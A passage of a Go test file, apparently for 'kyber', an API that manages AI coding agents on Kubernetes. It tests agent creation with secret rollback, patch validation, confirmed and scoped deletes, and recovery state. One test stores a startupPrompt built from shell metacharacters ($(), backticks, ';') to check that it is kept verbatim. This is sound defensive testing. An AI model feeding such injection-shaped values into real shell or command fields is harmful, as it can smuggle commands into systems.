		t.Fatalf("reading pre-existing secret: %v", err)
	}
	if v := string(got.Data["token"]); v != "" {
		t.Errorf("stored data['token']: got %q, want empty (original was in StringData)", v)
	}
	// fake client promotes StringData → Data on create; original value sits in Data.
	// Whatever flavour the fake used, the important assertion is that the NEW token string never landed.
	if bytes := got.Data["token"]; strings.Contains(string(bytes), "SHOULD-NOT-OVERWRITE") {
		t.Errorf("orphan secret was silently overwritten with new token; got %q", bytes)
	}
	if v, ok := got.StringData["token"]; ok && v == "SHOULD-NOT-OVERWRITE" {
		t.Errorf("StringData overwritten with new token")
	}

	// Agent CR must not have been created.
	agent := &kyberv1.Agent{}
	err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, agent)
	if err == nil {
		t.Errorf("Agent CR was created despite secret conflict")
	} else if !k8serrors.IsNotFound(err) {
		t.Errorf("expected NotFound on agent, got: %v", err)
	}
}

// TestAgents_Create_AgentAlreadyExists_CleansUpSecrets verifies that when the
// Agent CR already exists, any Secrets this request created before the CR
// create failed are deleted — the handler does not leak orphans. See #61.
func TestAgents_Create_AgentAlreadyExists_CleansUpSecrets(t *testing.T) {
	existing := sampleAgentCRD("dave")
	h, k := buildAgentHandler(t, existing)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "dave",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu": "1", "memory": "2Gi", "disk": "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType":               "oauth",
			"telegramEnabled":        true,
			"telegramBotToken":       "tg-token-xyz",
			"telegramAllowedUserIds": []string{"1000000001"},
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusConflict {
		t.Fatalf("want 409 on agent conflict, got %d: %s", rr.Code, rr.Body.String())
	}

	// Secret created mid-flow must have been rolled back.
	got := &corev1.Secret{}
	err := k.Get(context.Background(), types.NamespacedName{Name: "dave-telegram", Namespace: "kyber-system"}, got)
	if err == nil {
		t.Errorf("dave-telegram secret leaked: still exists after 409 on agent create")
	} else if !k8serrors.IsNotFound(err) {
		t.Errorf("expected NotFound on orphan secret, got: %v", err)
	}
}

// TestAgents_Create_PersistsDiscordWebhookSecret verifies kyber#132 Phase 1:
// POST /api/v1/agents with secrets.discordEnabled + secrets.discordWebhookUrl
// creates a per-agent <name>-discord Secret with the URL stored under the
// "webhook-url" key (not "token", which is the convention for tokens).
// Also verifies that spec.secrets.discordEnabled lands on the resulting CR.
func TestAgents_Create_PersistsDiscordWebhookSecret(t *testing.T) {
	h, k := buildAgentHandler(t)

	body := map[string]interface{}{
		"name":    "dave",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu": "1", "memory": "2Gi", "disk": "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType":          "api-key",
			"anthropicApiKey":   "sk-ant-stub",
			"discordEnabled":    true,
			"discordWebhookUrl": "https://discord.com/api/webhooks/123/abc",
		},
	}
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", body)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("want 201, got %d: %s", rr.Code, rr.Body.String())
	}

	// Spec field landed.
	got := &kyberv1.Agent{}
	if err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("get agent: %v", err)
	}
	if !got.Spec.Secrets.DiscordEnabled {
		t.Error("spec.secrets.discordEnabled must be true after create")
	}

	// Secret materialised with the right shape.
	sec := &corev1.Secret{}
	if err := k.Get(context.Background(), types.NamespacedName{Name: "dave-discord", Namespace: "kyber-system"}, sec); err != nil {
		t.Fatalf("dave-discord secret: %v", err)
	}
	want := "https://discord.com/api/webhooks/123/abc"
	if got := string(sec.Data["webhook-url"]); got != want {
		t.Errorf("webhook-url: got %q, want %q", got, want)
	}
	// kyber#132 spec: key is "webhook-url" (URL, not bearer token); the
	// "token" key used by Telegram MUST NOT be set on this secret to avoid
	// confusing future readers.
	if _, present := sec.Data["token"]; present {
		t.Error("dave-discord secret must use key 'webhook-url' (not 'token')")
	}
}

// TestAgents_Create_OmitsDiscordSecretWhenDisabled — the Secret should not
// be created when discordEnabled=false even if a webhook URL was provided.
func TestAgents_Create_OmitsDiscordSecretWhenDisabled(t *testing.T) {
	h, k := buildAgentHandler(t)
	body := map[string]interface{}{
		"name":    "eve",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu": "1", "memory": "2Gi", "disk": "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType":          "api-key",
			"anthropicApiKey":   "sk-ant-stub",
			"discordEnabled":    false,
			"discordWebhookUrl": "https://discord.com/api/webhooks/123/abc",
		},
	}
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", body)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("want 201, got %d: %s", rr.Code, rr.Body.String())
	}
	if err := k.Get(context.Background(), types.NamespacedName{Name: "eve-discord", Namespace: "kyber-system"}, &corev1.Secret{}); err == nil {
		t.Error("eve-discord secret must not be created when discordEnabled=false")
	} else if !k8serrors.IsNotFound(err) {
		t.Errorf("expected NotFound on missing discord secret; got %v", err)
	}
}

// TestAgents_List verifies GET /api/v1/agents returns all agents.
func TestAgents_List(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"), sampleAgentCRD("chewie"))
	req := authedRequest(t, http.MethodGet, "/api/v1/agents", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentListResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decoding: %v", err)
	}
	if len(resp.Items) != 2 {
		t.Errorf("want 2, got %d", len(resp.Items))
	}
}

// TestAgents_List_StableOrdering pins the response order to ascending ID so
// the PWA's mobile card view doesn't reshuffle on each refetch (#263).
// Seeds in non-alphabetical order to make sure the sort is doing the work,
// not the underlying client.
func TestAgents_List_StableOrdering(t *testing.T) {
	h, _ := buildAgentHandler(t,
		sampleAgentCRD("zeta"),
		sampleAgentCRD("alpha"),
		sampleAgentCRD("mu"),
	)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentListResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	got := make([]string, len(resp.Items))
	for i, a := range resp.Items {
		got[i] = a.ID
	}
	want := []string{"alpha", "mu", "zeta"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("listAgents order = %v, want %v", got, want)
	}
}

// TestAgents_List_HydratesTokenUsage verifies the list response embeds the
// TokenStore snapshot for each agent when one is present, and omits the field
// when the store has no entry. The PWA overview relies on this to render a
// Context column without a per-row /token-usage fetch.
func TestAgents_List_HydratesTokenUsage(t *testing.T) {
	ts := tokenstore.NewMemoryStore()
	// Reporter-shaped: raw Used + model; Limit/pct are resolved SERVER-SIDE at
	// serve time (#500), so the stored Limit is the 0 sentinel and the response
	// Limit is the model's real window (claude-sonnet-4-5 → 200K, a known model
	// — resolves without any ConfigMap/snapshot entry).
	_ = ts.Put(context.Background(), "dave", &tokenreport.Snapshot{
		Model:              "claude-sonnet-4-5",
		Tokens:             tokenreport.Tokens{Used: 74357, Limit: 200_000},
		ContextWindowKnown: true,
	})
	// "chewie" intentionally has no entry — should come back with TokenUsage nil.
	h := buildHandlerWithTokenStore(t, ts, sampleAgentCRD("dave"), sampleAgentCRD("chewie"))

	req := authedRequest(t, http.MethodGet, "/api/v1/agents", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentListResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	byID := map[string]api.AgentResponse{}
	for _, a := range resp.Items {
		byID[a.ID] = a
	}
	dave, ok := byID["dave"]
	if !ok {
		t.Fatalf("dave missing from list")
	}
	if dave.TokenUsage == nil {
		t.Fatalf("dave.TokenUsage nil; want hydrated snapshot")
	}
	if dave.TokenUsage.Tokens.Used != 74357 {
		t.Errorf("dave.TokenUsage.Tokens.Used=%d want 74357 (raw, preserved)", dave.TokenUsage.Tokens.Used)
	}
	if dave.TokenUsage.Tokens.Limit != 200_000 {
		t.Errorf("dave.TokenUsage.Tokens.Limit=%d want 200000 (server-resolved: sonnet-4-5 is a known 200K model)", dave.TokenUsage.Tokens.Limit)
	}
	if !dave.TokenUsage.ContextWindowKnown {
		t.Errorf("dave.TokenUsage.ContextWindowKnown=false want true (sonnet-4-5 is a known model)")
	}
	chewie, ok := byID["chewie"]
	if !ok {
		t.Fatalf("chewie missing from list")
	}
	if chewie.TokenUsage != nil {
		t.Errorf("chewie.TokenUsage=%+v; want nil when no snapshot stored", chewie.TokenUsage)
	}
}

// TestAgents_Get_Found verifies GET /api/v1/agents/{name} returns the agent.
func TestAgents_Get_Found(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
}

func TestAgents_Get_NeedsAuthExplainsClaudeOAuthCredential(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Spec.Runtime = "claude-code"
	agent.Spec.Secrets.AuthType = kyberv1.AgentAuthTypeOAuth
	agent.Status.Phase = kyberv1.AgentPhaseNeedsAuth
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var got struct {
		BlockedReason string `json:"blockedReason"`
	}
	if err := json.Unmarshal(rr.Body.Bytes(), &got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if !strings.Contains(got.BlockedReason, "missing, expired, or invalid") {
		t.Fatalf("NeedsAuth must explain the credential problem, got %q", got.BlockedReason)
	}
}

// TestAgents_Get_NotFound verifies 404 for unknown agent.
func TestAgents_Get_NotFound(t *testing.T) {
	h, _ := buildAgentHandler(t)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/ghost", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusNotFound {
		t.Errorf("want 404, got %d", rr.Code)
	}
}

// TestAgents_Patch verifies PATCH /api/v1/agents/{name} applies partial updates.
func TestAgents_Patch(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	newModel := "claude-opus-4"
	req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{
		"model": newModel,
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decoding: %v", err)
	}
	if resp.Model != newModel {
		t.Errorf("Model: got %q, want %q", resp.Model, newModel)
	}
}

func TestAgents_PatchRejectsUnsafeA2APeers(t *testing.T) {
	tests := []struct {
		name  string
		peers []map[string]interface{}
	}{
		{
			name: "userinfo URL",
			peers: []map[string]interface{}{{
				"name": "auditor", "url": "https://user@agents.example/a2a", "credential": map[string]interface{}{"existingSecret": "auditor-token", "key": "token"},
			}},
		},
		{
			name: "duplicate name",
			peers: []map[string]interface{}{
				{"name": "auditor", "url": "https://one.example/a2a", "credential": map[string]interface{}{"existingSecret": "auditor-token", "key": "token"}},
				{"name": "auditor", "url": "https://two.example/a2a", "credential": map[string]interface{}{"existingSecret": "auditor-token", "key": "token"}},
			},
		},
		{
			name: "invalid secret name",
			peers: []map[string]interface{}{{
				"name": "auditor", "url": "https://agents.example/a2a", "credential": map[string]interface{}{"existingSecret": "NOT_VALID", "key": "token"},
			}},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			agent := sampleAgentCRD("dave")
			h, _ := buildAgentHandler(t, agent)
			req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{"a2aPeers": tc.peers})
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400; body=%s", rr.Code, rr.Body.String())
			}
			if !strings.Contains(rr.Body.String(), `"field":"a2aPeers"`) {
				t.Fatalf("response does not identify a2aPeers: %s", rr.Body.String())
			}
		})
	}
}

func TestAgents_PatchStartupPromptSetAndClear(t *testing.T) {
	h, k := buildAgentHandler(t, sampleAgentCRD("dave"))
	for _, tc := range []struct {
		name  string
		value string
	}{
		{"set", "First line\n'\" $() `ticks` ; --flag"},
		{"clear", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{"startupPrompt": tc.value})
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusOK {
				t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
			}
			var got kyberv1.Agent
			if err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
				t.Fatalf("getting agent: %v", err)
			}
			if got.Spec.StartupPrompt != tc.value {
				t.Errorf("StartupPrompt=%q, want %q", got.Spec.StartupPrompt, tc.value)
			}
		})
	}
}

// TestAgents_PatchSessionResume covers the kyber#118 toggle: PATCH true
// lands on spec.sessionResume, PATCH false clears it, and the response
// reflects the new value.
func TestAgents_PatchSessionResume(t *testing.T) {
	h, k := buildAgentHandler(t, sampleAgentCRD("dave"))
	for _, tc := range []struct {
		name  string
		value bool
	}{
		{"enable", true},
		{"disable", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{"sessionResume": tc.value})
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusOK {
				t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
			}
			var got kyberv1.Agent
			if err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
				t.Fatalf("getting agent: %v", err)
			}
			if got.Spec.SessionResume != tc.value {
				t.Errorf("SessionResume=%v, want %v", got.Spec.SessionResume, tc.value)
			}
			var resp api.AgentResponse
			if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
				t.Fatalf("decoding: %v", err)
			}
			if resp.SessionResume != tc.value {
				t.Errorf("response SessionResume=%v, want %v", resp.SessionResume, tc.value)
			}
		})
	}
}

func TestAgents_PatchRequestReplyEnabled(t *testing.T) {
	h, k := buildAgentHandler(t, sampleAgentCRD("dave"))
	for _, value := range []bool{true, false} {
		req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{"requestReplyEnabled": value})
		rr := httptest.NewRecorder()
		h.ServeHTTP(rr, req)
		if rr.Code != http.StatusOK {
			t.Fatalf("PATCH %v: want 200, got %d: %s", value, rr.Code, rr.Body.String())
		}
		var got kyberv1.Agent
		if err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
			t.Fatalf("getting agent: %v", err)
		}
		if got.Spec.RequestReplyEnabled != value {
			t.Errorf("RequestReplyEnabled=%v, want %v", got.Spec.RequestReplyEnabled, value)
		}
		var resp api.AgentResponse
		if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
			t.Fatalf("decoding: %v", err)
		}
		if resp.RequestReplyEnabled != value {
			t.Errorf("response RequestReplyEnabled=%v, want %v", resp.RequestReplyEnabled, value)
		}
	}
}

func TestAgents_PatchProfileSetAndClear(t *testing.T) {
	h, k := buildAgentHandler(t, sampleAgentCRD("dave"))
	for _, tc := range []struct {
		name, alias, description string
	}{
		{"set", "Dave", "Handles deployment reviews"},
		{"clear", "", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{
				"profile": map[string]string{"alias": tc.alias, "description": tc.description},
			})
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusOK {
				t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
			}
			var got kyberv1.Agent
			if err := k.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
				t.Fatalf("getting agent: %v", err)
			}
			if got.Spec.Profile.Alias != tc.alias || got.Spec.Profile.Description != tc.description {
				t.Fatalf("profile=%+v, want alias=%q description=%q", got.Spec.Profile, tc.alias, tc.description)
			}
		})
	}
}

func TestAgents_PatchProfileRejectsOverLimit(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{
		"profile": map[string]string{"alias": strings.Repeat("界", 81)},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest || !strings.Contains(rr.Body.String(), "profile.alias") {
		t.Fatalf("want field-specific 400, got %d: %s", rr.Code, rr.Body.String())
	}
}

func TestAgents_PatchStartupPromptRejectsOverLimit(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPatch, "/api/v1/agents/dave", map[string]interface{}{"startupPrompt": strings.Repeat("界", 32769)})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest || !strings.Contains(rr.Body.String(), "startupPrompt") {
		t.Fatalf("want field-specific 400, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Delete verifies a confirmed, authorized DELETE returns 204 (AC-4).
// kyber#565: DELETE now requires ?confirm=<name>.
func TestAgents_Delete(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodDelete, "/api/v1/agents/dave?confirm=dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusNoContent {
		t.Errorf("want 204, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Delete_NotFound verifies 404 for unknown agent delete (with a
// matching ?confirm so the request passes the gate and reaches the lookup).
func TestAgents_Delete_NotFound(t *testing.T) {
	h, _ := buildAgentHandler(t)
	req := authedRequest(t, http.MethodDelete, "/api/v1/agents/ghost?confirm=ghost", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusNotFound {
		t.Errorf("want 404, got %d", rr.Code)
	}
}

// TestAgents_Delete_Unconfirmed_Rejected covers AC-1 + AC-6: a DELETE with no
// (or a mismatched) ?confirm is rejected 400 and the agent is NOT deleted — the
// always-on safety interlock.
func TestAgents_Delete_Unconfirmed_Rejected(t *testing.T) {
	cases := []struct {
		name   string
		target string
	}{
		{"missing confirm", "/api/v1/agents/dave"},
		{"empty confirm", "/api/v1/agents/dave?confirm="},
		{"mismatched confirm", "/api/v1/agents/dave?confirm=davy"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			h, k := buildAgentHandler(t, sampleAgentCRD("dave"))
			req := authedRequest(t, http.MethodDelete, c.target, nil)
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusBadRequest {
				t.Fatalf("want 400, got %d: %s", rr.Code, rr.Body.String())
			}
			if !strings.Contains(rr.Body.String(), "confirmation_required") {
				t.Errorf("want confirmation_required error code, got %s", rr.Body.String())
			}
			var got kyberv1.Agent
			if err := k.Get(context.Background(),
				types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
				t.Errorf("agent must still exist after a rejected delete, got err: %v", err)
			}
		})
	}
}

// TestAgents_Delete_Unauthorized_Rejected covers AC-2: with enforcement on, an
// under-scoped (lifecycle:write) caller is rejected 403 even with a correct
// ?confirm, and the agent is NOT deleted.
func TestAgents_Delete_Unauthorized_Rejected(t *testing.T) {
	h, k := buildScopedAgentHandler(t, sampleAgentCRD("dave"))
	req := scopedRequest(http.MethodDelete, "/api/v1/agents/dave?confirm=dave", writeScopedKey)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusForbidden {
		t.Fatalf("want 403, got %d: %s", rr.Code, rr.Body.String())
	}
	var got kyberv1.Agent
	if err := k.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
		t.Errorf("agent must still exist after an unauthorized delete, got err: %v", err)
	}
}

// TestAgents_Delete_Authorized_Succeeds covers AC-2 + AC-4: with enforcement on,
// an admin-scoped caller with a correct ?confirm succeeds (204).
func TestAgents_Delete_Authorized_Succeeds(t *testing.T) {
	h, _ := buildScopedAgentHandler(t, sampleAgentCRD("dave"))
	req := scopedRequest(http.MethodDelete, "/api/v1/agents/dave?confirm=dave", adminScopedKey)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusNoContent {
		t.Errorf("want 204, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Start verifies POST /api/v1/agents/{name}/start sets desiredPhase.
func TestAgents_Start(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/start", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Errorf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
}

// buildStatusAwareAgentHandler mirrors buildAgentHandler but registers Agent's
// status subresource on the fake client, which the CRD declares
// (deploy/helm/kyber/crds/kyber.io_agents.yaml — `subresources: status: {}`).
// Without it a Status().Patch 404s against the fake client only; the same call
// is fine against a real API server. Same pattern as internal_status_test.go.
func buildStatusAwareAgentHandler(t *testing.T, objs ...runtime.Object) (http.Handler, client.Client) {
	t.Helper()
	scheme := mustNewScheme(t)
	all := append([]runtime.Object{defaultMachine()}, objs...)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithStatusSubresource(&kyberv1.Agent{}).
		WithRuntimeObjects(all...).
		Build()
	s := &api.Server{
		K8sClient:     fakeClient,
		APIKey:        testAPIKey,
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}
	return s.BuildHandler(), fakeClient
}

// kyber#684: NeedsAuth and MemoryExhausted no longer leave on the standing
// desiredPhase==Running — the controller requires the operator-supplied input to
// have changed, which is what stopped a dead credential rebuilding its pod every
// ~20s forever. The re-auth flow and /set-resources satisfy that naturally
// (both write the input), but a bare Start does not. So Start must clear the
// recorded input, or the button silently does nothing on exactly the agents an
// operator is most likely to press it on.
func TestAgents_Start_ClearsRecoveryInputOnHumanRequiredPhases(t *testing.T) {
	for _, phase := range []kyberv1.AgentPhase{
		kyberv1.AgentPhaseNeedsAuth,
		kyberv1.AgentPhaseMemoryExhausted,
	} {
		t.Run(string(phase), func(t *testing.T) {
			agent := sampleAgentCRD("dave")
			agent.Status.Phase = phase
			agent.Status.RecoveryInput = "rv:dave-oauth:100"

			h, c := buildStatusAwareAgentHandler(t, agent)
			req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/start", nil)
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusOK {
				t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
			}

			var got kyberv1.Agent
			if err := c.Get(context.Background(),
				types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
				t.Fatalf("get agent: %v", err)
			}
			if got.Status.RecoveryInput != "" {
				t.Errorf("Start left recoveryInput=%q — the agent will ignore the operator and stay wedged",
					got.Status.RecoveryInput)
			}
			if got.Spec.DesiredPhase != kyberv1.AgentPhaseRunning {
				t.Errorf("desiredPhase = %q, want Running", got.Spec.DesiredPhase)
			}
		})
	}
}

// /set-resources is the other explicit operator action that must survive the
// gate. A memory bump re-arms it on its own (the recorded input is the memory
// limit), but a CPU-only change does not — and that would leave an operator who
// just acted staring at an agent that ignores them. Same fix as Start.
func TestAgents_SetResources_ClearsRecoveryInputOnMemoryExhausted(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseMemoryExhausted
	agent.Status.RecoveryInput = "mem=2Gi"

	h, c := buildStatusAwareAgentHandler(t, agent)
	// CPU-only change: the memory limit — and so the recorded input — is untouched.
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources",
		map[string]interface{}{"cpu": "2"})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	var got kyberv1.Agent
	if err := c.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
		t.Fatalf("get agent: %v", err)
	}
	if got.Status.RecoveryInput != "" {
		t.Errorf("set-resources left recoveryInput=%q — a CPU-only change would be silently ignored",
			got.Status.RecoveryInput)
	}
	// And the request the operator actually made must still land. Clearing the
	// gate runs a Status().Patch mid-handler, and controller-runtime decodes the
	// response back into the object it is handed — so patching `agent` itself
	// reverted spec.resources and spec.desiredPhase to their stored values, and
	// the resources patch that follows wrote nothing while still answering 200.
	if got.Spec.Resources.CPU.String() != "2" {
		t.Errorf("cpu=%s, want 2 — the resource change was swallowed by the status patch",
			got.Spec.Resources.CPU.String())
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRunning {
		t.Errorf("desiredPhase=%q, want Running — MemoryExhausted recovery never fires without it",
			got.Spec.DesiredPhase)
	}
}

// Failed carries the same defect and gets the same treatment. The controller
// no longer leaves Failed on the standing desiredPhase==Running (it would never
// reach maxRestartRetries, so a crash-looping agent rebuilt its pod forever), and
// a Start on an agent already carrying desiredPhase==Running writes no spec
// change for anything downstream to notice. Clearing the spent retry budget is
// what keeps the button working.
func TestAgents_Start_ClearsRestartCountOnFailed(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseFailed
	agent.Status.RestartCount = 3
	agent.Spec.DesiredPhase = kyberv1.AgentPhaseRunning // already Running: no spec change to make

	h, c := buildStatusAwareAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/start", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	var got kyberv1.Agent
	if err := c.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
		t.Fatalf("get agent: %v", err)
	}
	if got.Status.RestartCount != 0 {
		t.Errorf("Start left restartCount=%d — the agent has no budget left and will ignore the operator",
			got.Status.RestartCount)
	}
}

// A Start on a healthy agent must not touch the retry budget — an agent that is
// merely Stopped has nothing to re-arm, and zeroing the counter there would
// discard crash history the 5-minute stability reset owns.
func TestAgents_Start_LeavesRestartCountOnOtherPhases(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseStopped
	agent.Status.RestartCount = 2

	h, c := buildStatusAwareAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/start", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	var got kyberv1.Agent
	if err := c.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
		t.Fatalf("get agent: %v", err)
	}
	if got.Status.RestartCount != 2 {
		t.Errorf("restartCount = %d, want it untouched on a non-Failed phase", got.Status.RestartCount)
	}
}

// A Start on a healthy agent must not touch the field — clearing it there would
// re-arm a gate that is not holding anything.
func TestAgents_Start_LeavesRecoveryInputOnOtherPhases(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseStopped
	agent.Status.RecoveryInput = "rv:dave-oauth:100"

	h, c := buildStatusAwareAgentHandler(t, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/start", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	var got kyberv1.Agent
	if err := c.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, &got); err != nil {
		t.Fatalf("get agent: %v", err)
	}
	if got.Status.RecoveryInput != "rv:dave-oauth:100" {
		t.Errorf("recoveryInput = %q, want it untouched on a non-human-required phase", got.Status.RecoveryInput)
	}
}

// TestAgents_Stop verifies POST /api/v1/agents/{name}/stop sets desiredPhase.
